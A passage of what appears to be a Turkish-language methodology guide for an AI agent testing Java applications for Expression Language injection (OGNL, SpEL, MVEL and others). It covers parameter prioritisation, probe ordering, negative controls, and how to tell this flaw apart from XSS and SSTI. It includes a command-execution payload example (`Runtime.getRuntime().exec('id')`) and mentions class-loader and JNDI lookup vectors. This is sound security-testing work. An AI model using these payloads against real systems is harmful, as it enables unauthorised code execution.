GraphQL variable            `variables` JSON objesinin bir alanı
GraphQL argument             Query/mutation'ın kendi body'sinde satır-içi
WebSocket mesaj alanı       Genelde JSON, ama HTTP request/response
                          döngüsü olmadığı için farklı bir OOB/timing
                          zaman çizelgesi gerekir
Stored/veritabanı değeri    §9 Stored/Indirect prosedürüne tabidir
```

Pratik kural: Bir parametre adı yüksek öncelikli listede olsa bile,
**konumu** ayrı bir değişkendir ve state tablosuna (§1.2) ayrı bir
alan olarak eklenmelidir (`input_location`). Aynı ad+konum
kombinasyonu tekrar test edilmez, ama aynı ad **farklı** konumlarda
görülüyorsa (ör. hem query hem JSON body'de `filter`) her ikisi de
ayrı aday olarak değerlendirilir.

**Recursive traversal (JSON/XML/GraphQL nested yapılar için):**
Bir `filter`/`condition`/`rule` gibi yüksek öncelikli alan adı, düz bir
scalar değer olarak değil, iç içe bir obje/array olarak da gelebilir:
```json
{
  "filter": {
    "condition": "...",
    "expression": "...",
    "rules": [ { "field": "...", "op": "...", "value": "..." } ]
  }
}
```
Bu durumda discovery, yalnızca en dıştaki `filter` anahtarını değil,
JSON/XML ağacının **tamamını** (her seviyedeki her key'i) yüksek
öncelikli isim listesine karşı recursive olarak taramalıdır — aksi
halde `rules[0].expression` gibi 3. seviye bir alan discovery
aşamasında hiç görülmeden atlanır.
(Ajax partial-render parametreleri — bazı JSF implementasyon
hatalarında bu alanlar EL context'ine sızabilir)

**Struts2/WebWork'e özgü (tarihsel olarak en sık istismar edilen
parametre isimleri):**
`debug`, `expression`, `redirect`, `redirectAction`, `topSaveRules`,
`class` (`class.classLoader...` zincirleriyle istismar edilen ünlü
parametre adı deseni)

**Bilinçli olarak DIŞARIDA bırakılanlar:** `value`, `data`, `input`,
`output`, `label`, `caption`, `description`, `format`, `config`,
`settings`, `params`, `action`, `handler`, `code`, `type`, `key`,
`id`, `status`, `state` gibi son derece jenerik terimler bu listeye
**kasıtlı olarak eklenmemiştir** — nadirlik/ayırt edicilik esastır,
kapsayıcılık değil (bkz. SSTI skill'indeki aynı prensip).

### Risk skoru (basit toplama modeli — örnek, standart değil)
| Sinyal | Puan |
|---|---|
| Parametre adı eşleşmesi | +3 |
| Endpoint kategorisi eşleşmesi | +3 |
| Response'ta EL-hata sinyali (örn. "PropertyNotFoundException") | +4 |
| Teknoloji fingerprint bilinen bir EL motoruna işaret ediyor (Struts2→OGNL, Spring→SpEL) | +2 |
| Stored/indirect zincir şüphesi (örn. kural motoruna kaydedilen bir koşul) | +2 |

Toplam ≥5 olan (endpoint, parametre) çiftleri generic detection
kuyruğuna öncelikli alınır.

**Bu skorla §10.5'teki confidence scoring'i karıştırma:** Bu bölümdeki
risk skoru, testin **başında**, henüz hiçbir payload gönderilmeden,
yalnızca **hangi adayın önce test edileceğine** karar vermek için
kullanılır (bir kuyruk sıralama mekanizması — düşük skorlu bir aday
da test edilir, sadece sırası geriden gelir). §10.5'teki confidence
scoring ise testin **sonunda**, gerçek payload sonuçlarına dayanarak,
**bulgunun SAFE/CANDIDATE/CONFIRMED olarak sınıflandırılması** için
kullanılır. Yani biri "ne zaman test edeyim", diğeri "sonucu nasıl
sınıflandırayım" sorusuna cevap verir — iki ayrı, birbirini
etkilemeyen mekanizmadır.

### Duplicate önleme (agent state)
Her denenen kombinasyonu şu 6 alanla bir state tablosunda tut:

| Alan | Açıklama |
|---|---|
| endpoint | Test edilen URL/route |
| parameter | Etkilenen parametre adı |
| context | plain/HTML/attribute/JSON-field/config-value/expression (§6) |
| payload_family | generic-arithmetic / string-eval / object-discovery / RCE-gadget / OOB vb. |
| engine_hypothesis | O anki lider engine tahmini (OGNL/SpEL/MVEL/JEXL/CEL/... veya "unknown") |
| evidence_category | reflection/evaluation/fingerprint/context/stored-indirect/OOB (§8.3) |

Yeni bir probe denemeden önce bu tabloyu kontrol et — aynı 6'lı
kombinasyon **aynı execution koşulları altında** daha önce
denenmişse tekrar çalıştırılmaz. **Ama "aynı 6'lı" ile "aynı koşul"
eşanlamlı değildir** — şu değişkenlerden biri değiştiyse, aynı 6'lı
kombinasyon meşru bir şekilde yeniden denenebilir (bu durum
tekrar sayılmaz, yeni bir test koşulu sayılır):
```text
- authentication/session state değişti (ör. yeniden login olundu,
  farklı bir rolle giriş yapıldı)
- WAF/filter bypass encoding'i değişti (bkz. §8.2)
- Content-Type/taşıma katmanı değişti (ör. aynı payload JSON yerine
  form-encoded olarak denendi)
- Hedefin kendisi değişti (ör. bir deployment/config güncellendi)
```
Pratik kural: state tablosundaki 6 alana bir 7. alan daha eklenebilir
— `execution_context` (ör. `session=A`, `waf_bypass=none` gibi kısa bir
etiket). Bu alan da farklıysa, kombinasyon "yeni" sayılır.

---

## 3. Source → Transformation → EL Sink Modellemesi

Bir adayı test etmeden önce şu soruyu açıkça sor: **"Bu input gerçekten
bir EL motorunun parse/evaluation sink'ine mi ulaşıyor, yoksa bir
transformation'da mı tükeniyor?"**

```
(A) EL Injection'a yol açabilecek akış:
parameter → controller → ExpressionParser.parseExpression(user_input)
   .getValue(context)   [sink — input EL İFADESİNİN KENDİSİ]

(B) EL Injection'a yol açmayan akış (aynı parametre olsa bile):
parameter → controller → sanitizer → database → business logic
   → sabit (geliştiricinin yazdığı) bir EL ifadesinin bir DEĞİŞKEN
     DEĞERİ olarak (örn. #{userInput} değil, context.setVariable
     ("x", userInput) ile) kullanılır — normal/güvenli EL kullanımı
```

**Pratik ayrım testi:** Motorun kendi ifade sözdizimini (`${ }`,
`#{ }`, `%{ }`, çıplak OGNL/MVEL ifadesi) parametre değeri olarak
dene. Eğer bu sözdizimi **derleniyor/evaluate ediliyor** (yalnızca
düz metin olarak reflect edilmiyor) → (A) tipi, EL Injection adayı.
Yalnızca düz metin olarak yansıyorsa → muhtemelen (B) tipi.

### 3.1 XSS ile Ayrım — Aynı Yüzeysel Belirti, Tamamen Farklı Sink

`${...}` gibi bir dizinin response'ta reflect olması, tek başına ne EL
Injection'ı ne de XSS'i kanıtlar — hangisi olduğu, girdinin **hangi
motora** ulaştığına bağlıdır:

- Girdi **sunucu tarafındaki bir EL motoruna** (SpEL, OGNL, Java EL
  vb.) bir ifade olarak ulaşıyorsa ve orada **evaluate ediliyorsa** →
  EL Injection (bu bölümdeki (A) akışı). Kanıt: ham HTTP response'ta
  **hesaplanmış** bir sonuç görünür (örn. `${7*7}` yerine `49`
  görünür).
- Girdi sunucuda hiç EL olarak işlenmeden ham HTML/JS olarak
  response'a yazılıyor ve **tarayıcıda** yorumlanıyorsa (DOM'a
  enjekte oluyor, `<script>` bağlamında çalışıyor) → XSS, bu skill'in
  kapsamı dışında. `${...}` sözdizimi burada yalnızca bir **tesadüfi
  benzerlik**tir — tarayıcı `${...}`'ı Java EL sözdizimi olarak
  tanımaz, JS template literal'ları (backtick içinde) ile karıştırma.
- **Kritik pratik fark — nerede çalıştığının kanıtı aynı yöntemle
  bulunur (SSTI skill'indeki §3.1 ile birebir aynı prensip):**
  Aritmetik differential test'i (`6666*6666` → `44435556` vs
  `6666*6665` → farklı sonuç) yalnızca **sunucudan dönen ham HTTP
  response'ta** (curl/view-source çıktısı, tarayıcı render'ı değil)
  çalıştırılır. Ham response'ta hesaplanmış sonuç görünüyorsa → EL
  Injection. Ham response'ta hâlâ değiştirilmemiş `${6666*6666}`
  yazıyor ve sonuç yalnızca tarayıcıda (DevTools/rendered DOM'da)
  görünüyorsa → sunucu hiç evaluate etmemiştir, bu XSS'tir (client-side
  bir framework `${...}`'ı kendi template motoruyla yorumluyor
  olabilir — bu da CSTI'dir, kapsam dışı).
- **Yaygın karışıklık kaynağı — JSP/JSF sayfalarında:** Bir JSP
  sayfasında hem EL (`${...}`, sunucuda derlenir) hem de kullanıcı
  girdisinin escape edilmeden HTML'e basılması (klasik reflected XSS)
  **aynı anda** mevcut olabilir. Bu iki bulgu **ayrı ayrı**
  raporlanmalıdır — biri sunucu tarafı ifade motorunu hedef alır
  (EL Injection), diğeri tarayıcıyı (XSS); aynı parametre her ikisine
  de açık olabilir ama kanıtlama yöntemleri ve etkileri tamamen
  farklıdır.
- **CSP (Content-Security-Policy) notu:** Sıkı bir CSP header'ı
  (özellikle `script-src` kısıtlaması), reflected/DOM XSS'in tarayıcıda
  **çalışmasını** engelleyebilir — ama bu, sunucu tarafındaki EL
  motorunun ifadeyi evaluate etmesini **hiçbir şekilde etkilemez**
  (CSP tamamen tarayıcı-taraflı bir mekanizmadır, sunucu işleminden
  sonra devreye girer). Bu yüzden CSP varlığı EL Injection testini
  caydırmamalı — aksine, XSS'in CSP tarafından maskelenmiş/engellenmiş
  olduğu bir hedefte, aynı yansıyan `${...}` görünümünün aslında bir
  EL Injection olabileceği ihtimali (XSS değil) daha dikkatli
  değerlendirilmelidir; CSP'nin "güvenli görünüm" hissi, sunucu
  tarafı EL evaluation'ını gözden kaçırmaya yol açabilir.

### 3.2 SSTI ile Ayrım — En Kritik Sınır (KRİTİK)

EL Injection ile SSTI, literatürde en sık karıştırılan iki zafiyet
sınıfıdır — çünkü birçok template motoru (Thymeleaf, JSP) **arka
planda bir EL motoru kullanır**. Ayrım şu soruya dayanır: **saldırgan
neyi kontrol ediyor — template'in KAYNAĞINI mı, yoksa önceden var olan
bir EL ifadesinin DEĞERİNİ mü?**

```
SSTI:
  Saldırgan template KAYNAĞININ TAMAMINI veya bir PARÇASINI kontrol
  eder → örn. th:text="${kullanıcı_girdisi_burada_template_string}"
  → motor bunu bir template olarak PARSE EDER (yeni delimiter'lar,
  yeni ifade blokları açabilir)

EL Injection:
  Saldırgan yalnızca ZATEN VAR OLAN bir EL ifadesinin DEĞERİNİ (bir
  değişkenin/context anahtarının) kontrol eder → örn.
  th:text="${user.name}" ifadesi sabit koddadır, saldırgan yalnızca
  "user.name" değerini etkiler → motor delimiter açıp kapatmaz, var
  olan ifadeyi olduğu gibi çalıştırır

  VEYA — daha ilginç ve bu skill'in asıl odağı olan durum:
  Uygulama, kullanıcı girdisini DOĞRUDAN bir EL PARSER API'sine
  (örn. `ExpressionFactory.createValueExpression(...)`,
  `ELProcessor.eval(...)`, `OgnlContext`/`Ognl.getValue(...)`,
  `ExpressionParser.parseExpression(...)`) besler — burada template
  motoru YOKTUR, saldırgan doğrudan EL parser'ının girdisidir.
```

| | SSTI | EL Injection |
|---|---|---|
| Kontrol edilen şey | Template **kaynağının** kendisi (delimiter dahil) | Bir EL **parser API'sinin** doğrudan girdisi, ya da var olan bir EL ifadesinin değeri |
| Aradaki katman | Template engine (Jinja2/Twig/Thymeleaf/Freemarker) | Genelde **doğrudan** EL parser (`ELProcessor`, `Ognl`, `SpelExpressionParser`, `MVEL.eval`, `JexlEngine`) — bir template motoru katmanı OLMAYABİLİR |
| Delimiter enjeksiyonu gerekir mi | Evet (`{{`, `{%`, `${` gibi bir template sözdizimi kaynağı açmak/kapatmak) | Genelde HAYIR — payload doğrudan parser'a bir string olarak geçer, delimiter'a ihtiyaç duymayabilir (çıplak `T(...).exec(...)` gibi) |
| Tipik örnek | `{{7*7}}` bir Jinja2 template'inin İÇİNE enjekte ediliyor | `?sort=T(java.lang.Runtime).getRuntime().exec('id')` bir Spring Data sort parametresi olarak doğrudan SpEL parser'a gidiyor |
| Thymeleaf/JSP özel durumu | Kullanıcı girdisi runtime'da yeni bir **template kaynağı** (view/fragment string'i) haline geliyorsa → SSTI (nadir, bkz. SSTI skill §12.2) | Kullanıcı girdisi zaten var olan bir `${...}`/`#{...}` bloğunun İÇİNDEKİ bir değişken değeri olarak kullanılıyorsa (**çok daha yaygın**) → EL Injection |

**Pratik ayrım testi:** Motorun delimiter'ını (`{{`, `}}`, `{%`)
KAPATIP yeniden AÇMAYI dene: `AAA}}{{7*7}}{{BBB`. Eğer yalnızca
`AAA`/`BBB` kısmı literal kalıp ortadaki `{{7*7}}` evaluate
ediliyorsa VE bu, sabit template kaynağının **dışına çıkarak yeni bir
blok açtığını** gösteriyorsa → SSTI. Eğer delimiter'a hiç ihtiyaç
duymadan (`AAA}}{{7*7}}{{BBB` yerine sadece `7*7` veya
`T(...).exec(...)` gönderildiğinde) motor bunu doğrudan evaluate
ediyorsa → EL Injection (girdi zaten doğrudan parser'a gidiyor,
kaynak kontrolü söz konusu değil).

**Aynı parametrenin her ikisine de açık olabileceği durum (Thymeleaf/
SpEL):** Bkz. SSTI skill §6 Type Confusion — orada da belirtildiği
gibi, bir Thymeleaf/SpEL bağlamında bulunan zafiyet bazen SSTI bazen
EL Injection olarak sınıflandırılabilir; bu skill'in §14.1 raporlama
şablonundaki `vulnerability_class` alanı bu ayrımı **zorunlu** olarak
netleştirir. Genel kural: template kaynağının kendisi kontrol
ediliyorsa `SSTI`, yalnızca bir ifadenin değeri/parametresi kontrol
ediliyorsa `EL_INJECTION` olarak etiketlenir.

### 3.3 JNDI Injection ile Ayrım — Aynı Delimiter, Tamamen Farklı Mekanizma

Bazı eski JSP/JSF ortamlarında (ve genel olarak `${jndi:...}` /
`#{jndi:...}` benzeri sözdizimi kabul eden herhangi bir yerde,
Log4Shell/CVE-2021-44228 ailesiyle aynı kategoride) `${jndi:ldap://...}`
gibi bir görünüm EL delimiter'ıyla (`${...}`) **aynı işaretleri**
kullanır, ama tetiklenen mekanizma tamamen farklıdır: burada bir EL
motoru değil, Java'nın `InitialContext`/JNDI lookup mekanizması
istismar edilir (uzak bir LDAP/RMI kaynağından sınıf yükleme). Bu,
**bu skill'in kapsamı dışındadır** — JNDI Injection ayrı bir zafiyet
sınıfıdır (kendi CVE ailesi, kendi tespit/exploit metodolojisi vardır).
Pratik ayrım: `${jndi:...}` gördüğünde bunu `${6666*6666}` gibi bir
aritmetik EL probe'uyla **karıştırma** — biri EL parser'ına, diğeri
JNDI lookup'a gider; ikisinin aynı `${...}` "kabuğunu" paylaşması
tesadüftür, mekanizma ortak değildir. Bir hedefte `${jndi:...}`
sözdizimi kabul ediliyor gibi görünüyorsa, bu bulgu `vulnerability_class:
UNKNOWN` + rapor notunda "olası JNDI Injection, bu skill'in kapsamı
dışında, ayrı değerlendirilmeli" şeklinde işaretlenip bu skill'in
kendi EL testleriyle karıştırılmadan ayrıca ele alınmalıdır.

---

## 4. EL Injection Sink Discovery

Parametre adlarının yanı sıra, mümkünse **sink pattern'lerini** de ara.
Kaynak koda erişim varsa (açık kaynak proje, expose `.git`, JAR
dekompilasyonu, hata mesajlarında sınıf/paket adı) şu tür isimler bir
sinyaldir:

- `Ognl.getValue(...)`, `Ognl.setValue(...)`, `OgnlContext` (OGNL)
- `SpelExpressionParser().parseExpression(...)`, `#{...}` bean tanımı,
  `StandardEvaluationContext` (SpEL)
- `ExpressionFactory.createValueExpression(...)`,
  `ELProcessor.eval(...)`, `ELProcessor.getValue(...)`,
  `ELContext` (Java EL/UEL)
- `MVEL.eval(...)`, `MVEL.executeExpression(...)`,
  `ParserContext` (MVEL)
- `JexlEngine.createExpression(...)`, `JexlContext` (JEXL)
- `CelRuntime`, `Env.compile(...)` (CEL — Go/Java implementasyonları)
- `KieSession`, `DroolsRuleBuilder` (Drools/DRL)
- `AviatorEvaluator.execute(...)` (Aviator)
- `ExpressRunner.execute(...)` (QLExpress)

**Black-box (kaynak koda erişim yok) senaryoda** sink discovery
pratikte §2'deki attack surface taramasıyla örtüşür: yüksek öncelikli
endpoint kategorileri (arama/filtre/business-rule/workflow alanları)
zaten bu sink'lerin dışarıdan gözlemlenebilir izleridir. Hata
mesajlarında görülen sınıf adları (`ognl.OgnlException`,
`org.springframework.expression.spel.SpelEvaluationException`,
`javax.el.ELException`, `org.mvel2.CompileException`,
`org.apache.commons.jexl3.JexlException`) hem sink discovery hem
fingerprinting (§7) için aynı anda kullanılabilir.

---

## 5. Generic EL Injection Detection

### Kavramsal Zincir — Evaluation Kanıtı ile Engine Attribution Ayrı

```
Reflection
   ↓
Syntax recognition   (motor payload'ı en azından "tanıyor" mu?)
   ↓
Expression evaluation (gerçekten hesaplanıyor mu?)
   ↓
Controlled transformation (deterministic, öngörülebilir bir dönüşüm var mı?)
   ↓
Negatif kontrol doğrulaması (§5.1 — farklı payload FARKLI sonuç veriyor mu?)
   ↓
Engine attribution     (hangi engine — ayrı bir aşama, bkz. §7 Fingerprinting)
```

Her adım, kendinden öncekinin **gerekli ama tek başına yeterli
olmadığı** bir kanıt katmanıdır. Bu diyagram bir kanıt **olgunlaşma**
sürecini gösterir; "confirmed" etiketi için zorunlu kategori sayısı
kuralı yalnızca §8.4'te tanımlıdır — tek bir Eksen-1 kanıt türü
(evaluation/stored-indirect/OOB'dan biri) + geçerli bir negatif
kontrol, "confirmed" için yeterlidir.

### Fuzzing ile İlk Tarama (Polyglot — Düşük Öncelikli Triage)

EL motorlarının çoğunu aynı anda tetiklemeyi deneyen bir polyglot
(delimiter aileleri farklı olduğu için SSTI'dekinden farklı bir sette
— **yalnızca EL ailesi delimiter'ları**, SSTI/CSTI'ye özgü hiçbir
belirteç (`{{`, `<%`, `[`) içermez, ve aşağıdaki "Aritmetik Probe
Seçimi" kuralıyla tutarlı olması için `7*7` yerine yüksek-entropili
sonuç kullanır):

```
${6666*6666}#{6666*6666}%{6666*6666}@{6666*6666}6666*6666
```

Bu diziyi bir input'a gönderip normal veri ile karşılaştırıldığında
şu farklar EL Injection şüphesi doğurur: hata fırlatılması (motoru
ele verebilir), `44435556` sonucunun response'ta görünmesi, payload'ın
kısmen ya da tamamen response'tan eksik olması. **Önemli düzeltme
(SSTI skill'indeki aynı ilke):** Bu teknik güvenilir bir fingerprinting
mekanizması **değildir**, opsiyonel ve düşük öncelikli bir triage
tekniğidir; yalnızca standart sıralı fingerprinting tükendiğinde veya
son çare olarak denenmelidir.

### Aritmetik Probe Seçimi — Varsayılan Tercih (Guidance, Yasak Değil)

**Varsayılan olarak `7*7 → 49` gibi küçük ve yaygın sonuçlar üreten
probe'lar TERCİH EDİLMEZ** — bu tür sonuçlar response içinde
tesadüfen bulunma ihtimali yüksek olduğundan false-positive riskini
artırır. Bunun yerine **varsayılan olarak büyük, deterministic ve
response içinde doğal olarak bulunma ihtimali düşük** bir sonuç
kullanılır — SSTI skill'indeki aynı ilke ve aynı **ortak hedef değer**
burada da birebir korunur (araçlar/agent arası tutarlılık için
kasıtlı olarak aynı sabitler kullanılır):
```text
6666*6666 → 44435556
```
**Ama bu bir yasak değildir.** Hedefin kendine özgü kısıtları varsa
(ör. çok kısa bir expression alanı, sayısal üst sınır kontrolü, WAF'ın
büyük sayı içeren istekleri filtrelemesi, veya motorun numeric
davranışını hızlı bir şekilde anlama ihtiyacı), `7*7` gibi düşük-
entropili bir probe **fallback** olarak kullanılabilir — bu durumda
sonucun (`49`) gerçekten payload'dan mı geldiği, yoksa response'ta
zaten doğal olarak var olan bir sayı mı olduğu ekstra dikkatle (ör.
farklı bir çarpım, `8*8→64`, ile çapraz doğrulanarak) teyit
edilmelidir.

> **Çarpma:** `6666*6666` → ham sonuç: **`44435556`**
> **Çıkarma:** `44444444-8888` → ham sonuç: **`44435556`**

Çarpma ve çıkarma **eşit ağırlıklı, birbirini tamamlayan** iki ayrı
deneme yoludur — biri diğerinin yedeği değildir (bkz. SSTI skill §5
gerekçesi: bazı motorlarda operatörler farklı code path'lerden geçer).

**EL'e özgü ek not — string concatenation de birincil probe
ailesindendir:** Birçok EL motorunda (özellikle OGNL, MVEL, SpEL)
string concatenation (`+`) aritmetik kadar güvenilir bir evaluation
kanıtıdır ve bazı context'lerde (örn. yalnızca string tipi kabul eden
bir alan) aritmetikten daha güvenilir çalışabilir:

> **Concatenation:** `'EL_'+'INJECTION_'+'44435556'` → ham sonuç:
> **`EL_INJECTION_44435556`** (motora göre `~` operatörü de
> kullanılabilir — bkz. §12 engine profilleri)

### Aşamalı Generic Probe Sırası

Engine bilinmediğinde, düşük riskliden yükseğe doğru sırayla uygula.
Her probe'a biricik bir canary ekle (örn. `AAA_EL_<random>_ZZZ`).

1. **Marker-only (baseline):** `AAA_EL_1234_ZZZ` — yalnızca
   reflection/encoding/stripping davranışını öğrenmek için.
2. **Arithmetic — çarpma (delimiter matrisi, en yaygından başla):**
   `${6666*6666}` → `#{6666*6666}` → `%{6666*6666}` →
   `@{6666*6666}` → çıplak `6666*6666` (delimiter'sız OGNL/MVEL/JEXL
   context ihtimaline karşı, örn. bir JSON `"expression"` alanı).
   Hepsini tek istekte değil, ayrı ayrı dene; ham sonucu `44435556`
   üreteni işaretle.
3. **Arithmetic — çıkarma (aynı delimiter matrisiyle, çarpmadan
   bağımsız olarak dene, atlanmaz):**
   `${44444444-8888}` → `#{44444444-8888}` →
   `%{44444444-8888}` → çıplak `44444444-8888` — ham sonucu, çarpma
   probe'uyla **aynı** olan `44435556` üreteni işaretle.
4. **String concatenation:** `${'AAA_EL_'.concat('44435556')}`
   (Java EL/OGNL tarzı) → `${'AAA_EL_'+'44435556'}` (SpEL/MVEL tarzı)
   → sonuç `AAA_EL_44435556` üreteni işaretle. Bu, motorun string
   handling'ini gösterir, ama **güvenilirliği context'e bağlıdır ve
   aritmetikten otomatik olarak daha güçlü değildir** — özellikle
   `.concat()` bir **method invocation**'dır ve bazı kısıtlı
   context'lerde (ör. SpEL `SimpleEvaluationContext.forReadOnlyDataBinding()`,
   bkz. §12.3) method çağrıları tamamen kapalıyken temel aritmetik
   operatörleri (`+`/`-`/`*`) hâlâ çalışabilir — yani bu durumda concat
   probe'u aritmetikten **daha az** güvenilirdir, tam tersi değil. Bu
   yüzden concat, aritmetiğin **yerine** değil, **yanında** ek bir
   context-dependent sinyal olarak kullanılmalıdır; hangisinin daha
   güvenilir olduğu hedefin evaluation context'ine göre değişir.
5. **Boolean/comparison:** `${1==1}` / `${1==2}` çiftinin response
   farkını izle. Bu **tek başına zayıf** bir sinyaldir — yalnızca
   aritmetik/concatenation probe ile birlikte destekleyici kanıt
   olarak kullan.
6. **Context değişkeni interpolation:** Uygulamanın bilinen bir
   context değişkenini (örn. `${pageContext.request}`,
   `#request.getRealPath('/')`, `${systemProperties}`) çağırmayı
   dene — uygulama gerçekten basıyorsa güçlü sinyal (aynı zamanda
   §7 fingerprinting'e katkı sağlar, çünkü context değişken adları
   motora özgüdür).
7. **Error-based:** Kasıtlı bozuk sözdizimi (`${6666*6666`,
   `#{6666*6666`, dengesiz parantez) gönder, stack trace/EL hatası
   dönüp dönmediğine bak (bkz. §7 Fingerprinting — hata mesajları
   çoğu zaman motor adını doğrudan verir, bu en güvenilir sinyaldir).
8. **Çarpma, çıkarma ve concatenation da negatif dönüyor ama
   karakterler encode edilmiş şekilde yansıyorsa:** §8.2.3'teki
   karakter-seviyesi encoding oracle tekniğine geç.

### Pozitif Sayılma Kuralı — Gerekli Ama "Confirmed" İçin Tek Başına Yeterli Değil

**Pratik payload formu (marker + TEK bir probe birleştirilir — bu,
yukarıdaki "farklı delimiter varyantlarını ayrı ayrı dene" kuralıyla
ÇELİŞMEZ; o kural farklı delimiter'ları (`${}`/`#{}`/`%{}`) aynı anda
karıştırmamayı söylüyordu çünkü hangisinin çalıştığı belirsizleşir —
burada ise TEK bir delimiter'ın etrafına marker eklenerek response'taki
konumu net biçimde işaretleniyor, bu farklı bir amaç):**
Marker ve arithmetic probe'u pratikte **tek bir istekte birleştirilerek**
gönderilir:
```
AAA_EL_1234_${6666*6666}_ZZZ
AAA_EL_1234_${44444444-8888}_ZZZ
```
Beklenen pozitif response — **her iki payload için de aynı**:
`AAA_EL_1234_44435556_ZZZ`.

Bir probe'un **evaluation evidence** sayılması için:
1. Canary marker (`AAA_EL_1234`/`ZZZ`) response'ta bulunuyor **ve**
2. Hesaplanan ham sonuç (`44435556`) tam olarak marker'ın
   arasında/yerinde görünüyor **ve**
3. Geçerli bir **negatif kontrol** (bkz. §5.1) farklı bir sonuç
   veriyor.

Bu üç şart **evaluation evidence** için minimum settir ve §8.4'e göre
EL Injection için "confirmed" olarak yeterlidir — ayrı bir engine
fingerprint kanıtı **şart değildir**.

### 5.1 Negatif Kontrol Nasıl Kurulur

**Yanlış/yetersiz yaklaşım (kullanılmaz):** Payload'ın URL-encode
edilmiş halini "negatif kontrol" olarak göndermek tek başına
güvenilir değildir (bkz. SSTI skill §5.1 gerekçesi — decode zinciri
sonuç değiştirmeyebilir).

**Doğru/tercih edilen yaklaşım — differential comparison:**
```
AAA_EL_1234_${6666*6666}_ZZZ   → beklenen: 44435556
AAA_EL_1234_${6666*6665}_ZZZ   → beklenen: 44428890 (FARKLI sonuç)
```
Eğer uygulama yalnızca literal string'i reflect ediyorsa (evaluation
yok), her iki payload da birebir aynı şekilde görünür. Aynı teknik
çıkarma probe'u için de uygulanır: `44444444-8888` (→ `44435556`) vs
`44444444-8887` (→ `44435557`, FARKLI sonuç); concatenation için de:
`'AAA_'+'44435556'` (→ `AAA_44435556`) vs `'AAA_'+'44435557'`
(→ `AAA_44435557`, FARKLI sonuç).

**Alternatif — genuinely non-evaluating literal-escape:** Motorun
kendi sözdizimini bilerek bozan bir varyant (dengesiz delimiter:
`AAA_EL_1234_${6666*6666_ZZZ` — kapanış `}` olmadan) de bir negatif
kontrol olarak kullanılabilir.

**Özet kural:** Negatif kontrol seçerken "bu temsil kesinlikle
evaluate edilmez" varsayımını **encoding'e dayandırma** — bunun
yerine ya differential comparison (farklı beklenen sonuç) ya da
bilinçli sözdizimi bozma kullan.

**Response normalization — differential karşılaştırma öncesi zorunlu
temizlik:** İki response'u ("baseline" ve "aday payload") karşılaştırmadan
önce, aşağıdaki **dinamik/gürültü** alanları normalize edilmeli
(çıkarılmalı veya sabit bir placeholder ile değiştirilmeli), aksi
halde bunlardan kaynaklanan bir fark, evaluation kanıtı sanılabilir
(false positive) — veya tam tersi, gerçek bir evaluation farkı bu
gürültüye karışıp gözden kaçabilir (false negative):
```text
- CSRF token / nonce (her response'ta değişen tek-kullanımlık değer)
- Request ID / trace ID (X-Request-Id, X-Trace-Id gibi header'lar)
- Timestamp (response body veya header'daki tarih/saat damgaları)
- Rastgele/artan ID'ler (session id, oturum bazlı sayaç)
- Cache-Control/ETag gibi header'lar (içerikle ilgisiz metadata)
- JSON key sırası (bazı serializer'lar sırayı garanti etmez —
  karşılaştırma öncesi normalize edilmiş/sıralı bir forma getirilmeli)
- Compression farkı (gzip/brotli response boyutu payload uzunluğundan
  bağımsız olarak değişebilir — ham byte sayısı yerine decompress
  edilmiş içerik karşılaştırılmalı)
```
Bu normalizasyon yapılmadan yalnızca `baseline_response != payload_response`
görmek, tek başına "evaluation oldu" sonucuna vardırılamaz —
normalize edilmiş içerik hâlâ farklıysa VE bu fark beklenen
aritmetik/mantıksal sonuçla (ör. `44435556`) tutarlıysa, o zaman
evaluation kanıtı sayılır.

---

## 6. Context Detection

### Expression Boundary Discovery — Girdi Expression'ın Hangi Kısmını Kontrol Ediyor?

Context türünden (aşağıda) önce, daha temel bir soru sorulmalı: **saldırgan
girdisi, nihai expression'ın TAMAMINI mı, bir PARÇASINI mı, yoksa yalnızca
bir TOKEN/property adını mı oluşturuyor?** Bu, aynı context içinde bile
çok farklı sonuçlar doğurabilir:

```text
Senaryo A — Girdi TÜM expression'dır:
  parser.parseExpression(user_input)
  → Saldırgan sözdiziminin tamamını kontrol eder, en geniş yüzey.

Senaryo B — Girdi bir prefix/suffix içine SARILIYOR:
  parser.parseExpression("#{" + user_input + "}")
  → Saldırgan yalnızca içeriği kontrol eder; kapanış karakteri
    (`}`) ile expression'ı erken kapatıp devamına kod ekleyebilir
    (bkz. §8 escape/boundary-breakout teknikleri) — ama sarmalayıcının
    kendisini (delimiter'ı) değiştiremez.

Senaryo C — Girdi bir SABİT expression'ın PARÇASI (ör. property adı):
  parser.parseExpression("user." + user_input)
  → Saldırgan yalnızca "user." öneki olan bir property-access
    zincirinin devamını kontrol eder; tam bir yeni expression
    yazamaz ama property-chain'i (ör. "class.classLoader") uzatabilir.

Senaryo D — Girdi bir SABİT expression'ın DEĞERİNİ (string literal
içeriğini) DEĞİL, dolaylı olarak neyin evaluate edileceğini seçiyor:
  parser.parseExpression(CONFIG_MAP.get(user_input))
  → Saldırgan expression'ın kendisini yazamaz, yalnızca ÖNCEDEN
    TANIMLANMIŞ bir expression setinden birini SEÇER (bu genelde
    EL Injection değildir, olsa olsa "expression selection" mantık
    hatasıdır — CLASS: UNKNOWN veya ayrı değerlendirilmeli).
```

Pratik önemi: Bir aday negatif dönerse (ör. tam bir `T(java.lang.Runtime)`
payload'ı çalışmazsa), bunun nedeni motorun kısıtlı olması değil,
**girdinin yalnızca Senaryo C/D tipinde bir konumda olması** olabilir
— bu durumda agent, Senaryo B/C'ye özgü daha dar payload'lar (ör.
yalnızca bir property-chain uzantısı, `}` ile boundary-breakout)
denemeden "EL Injection yok" sonucuna varmamalıdır. Bu alan, agent
state tablosuna (§2 Duplicate önleme) `expression_boundary: full/
wrapped/fragment/selection` olarak eklenebilir.

### Context Türleri

Payload'ın uygulama içinde **nerede** durduğu, hangi kapatma
karakterlerinin gerektiğini ve hangi delimiter ailesinin geçerli
olduğunu belirler:

- **Plain text context** — herhangi bir etiket/attribute dışında düz
  metin (JSP/JSF sayfa içeriği gibi).
- **HTML attribute context** — bir HTML/JSF component attribute
  değeri içinde (`value="#{...}"`).
- **JSON field context** — bir API'nin JSON gövdesinde "expression"/
  "condition"/"rule" gibi bir alanın değeri (delimiter'sız çıplak
  ifade beklenebilir).
- **Config/manifest value context** — bir YAML/XML config değerinin
  içinde (Spring `application.yml`, Camel route XML'i, Kubernetes
  manifest'i — bkz. §11).
- **XML element değeri context'i** — bir XML elemanının **text
  content**'i olarak (`<rule>ifade</rule>`); genelde yalnızca `<`,
  `>`, `&` karakterleri XML entity olarak encode edilmesi gerekir,
  tırnak işareti sorun teşkil etmez.
- **XML attribute değeri context'i** — bir XML attribute'unun
